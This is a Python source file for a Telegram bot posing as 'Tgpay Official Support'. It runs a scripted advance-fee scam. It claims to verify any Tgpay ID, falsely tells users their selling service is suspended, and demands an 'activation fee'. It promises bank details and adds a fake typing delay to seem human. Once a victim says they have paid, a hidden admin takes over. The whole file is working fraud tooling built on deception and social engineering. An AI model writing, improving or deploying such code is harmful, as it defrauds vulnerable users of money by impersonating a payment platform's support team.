import os
import json
import time
import telebot
from dotenv import load_dotenv

# ---------------- LOAD ----------------
load_dotenv()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_ID = 8609446407 

bot = telebot.TeleBot(TOKEN)
USERS_FILE = "users.json"

# ---------------- USERS DATA HANDLING ----------------
def load_users():
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

users = load_users()
manual_mode = {}

# ---------------- CUSTOMER SUPPORT LOGIC (ENGLISH) ----------------
def get_step_reply(uid, text):
    msg = text.lower()
    user_data = users.get(uid, {})
    step = user_data.get("step", "start")

    # Step 1: Greeting
    if msg in ["hi", "hello", "hii", "hey", "/start"]:
        users[uid]["step"] = "wait_tgpay_id"
        save_users(users)
        return "Welcome to Tgpay Official Support. Please provide your **Tgpay ID** for account verification."

    # Step 2: Receive Tgpay ID & Connect
    elif step == "wait_tgpay_id":
        users[uid]["step"] = "connected"
        save_users(users)
        return f"System Check: Tgpay ID {text} verified. Your account has been **connected successfully** to our support server. How can we assist you?"

    # Step 3: Selling Issues (Not received/Not active)
    elif any(x in msg for x in ["selling nahi aa raha", "selling not received", "selling activate", "no sales", "selling issue"]):
        users[uid]["step"] = "selling_stopped"
        save_users(users)
        return "We regret to inform you that your selling service has been suspended. To reactivate it, you must either purchase one order or pay the mandatory **Selling Activation Fee**."

    # Step 4: Order Not Showing
    elif "order" in msg and ("nahi" in msg or "not" in msg or "show" in msg):
        users[uid]["step"] = "ask_fees"
        save_users(users)
        return "Due to high traffic on the platform, selling services are currently restricted. To bypass this and reactivate your dashboard, an **Activation Fee** is required."

    # Step 5: Fee Amount Inquiry
    elif any(x in msg for x in ["kitna", "how much", "fees?", "amount"]):
        users[uid]["step"] = "wait_confirmation"
        save_users(users)
        return "The activation fee depends on your pending selling orders. You will need to pay an amount equal to the activation order assigned to your account."

    # Step 6: User says OK / Where to pay?
    elif any(x in msg for x in ["oke", "okay", "ok", "kaha karna hai", "where to pay", "send details"]):
        users[uid]["step"] = "wait_for_bank"
        save_users(users)
        return "Please stay active. We will provide our official **Bank Details** as soon as they are available for your transaction. We can send them at any moment, so please keep your notifications on."

    # Step 7: User says "cannot pay"
    elif any(x in msg for x in ["nahi kar sakta", "cannot pay", "no money", "can't pay"]):
        return "If you are unable to pay the activation fee, you will have to manually monitor for orders within the Tgpay application only."

    # Step 8: Payment Done
    elif any(x in msg for x in ["payment done", "paid", "done", "transfer completed"]):
        users[uid]["step"] = "manual" # Stop auto-reply
        save_users(users)
        return "Payment notification received. Please wait while our finance team is **checking your transaction status**..."

    # Silent for everything else
    else:
        return None

# ---------------- MESSAGE HANDLERS ----------------

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    uid = str(message.chat.id)
    
    if uid not in users:
        users[uid] = {"name": message.from_user.first_name, "username": message.from_user.username, "step": "start"}
        save_users(users)

    # Stop bot if in manual mode or payment verification state
    if uid in manual_mode or users[uid].get("step") == "manual":
        # Forward user message to Admin
        bot.send_message(ADMIN_ID, f"💬 **User Message ({uid}):**\n{message.text}")
        return

    # Generate Professional Reply
    reply = get_step_reply(uid, message.text)

    if reply:
        bot.send_chat_action(message.chat.id, "typing")
        time.sleep(2) # Realistic typing delay
        bot.reply_to(message, reply)

# ---------------- ADMIN COMMANDS ----------------

@bot.message_handler(commands=['reply'])
def admin_reply(message):
    if message.chat.id != ADMIN_ID: return
    try:
        data = message.text.split(" ", 2)
        target_uid = data[1]
        msg_text = data[2]
        
        manual_mode[target_uid] = True # Turn off AI for this user
        bot.send_message(target_uid, msg_text)
        bot.send_message(ADMIN_ID, f"✅ Reply sent. AI disabled for user {target_uid}.")
    except:
        bot.send_message(ADMIN_ID, "❌ Format: /reply [user_id] [message]")

@bot.message_handler(commands=['auto'])
def set_auto(message):
    if message.chat.id != ADMIN_ID: return
    try:
        uid = message.text.split(" ")[1]
        if uid in manual_mode: del manual_mode[uid]
        users[uid]["step"] = "start"
        save_users(users)
        bot.send_message(ADMIN_ID, f"🤖 AI Auto-reply re-enabled for {uid}.")
    except:
        bot.send_message(ADMIN_ID, "❌ Format: /auto [user_id]")

# ---------------- START ----------------
print("Tgpay Support Bot is Live (Professional English Mode)...")
bot.infinity_polling()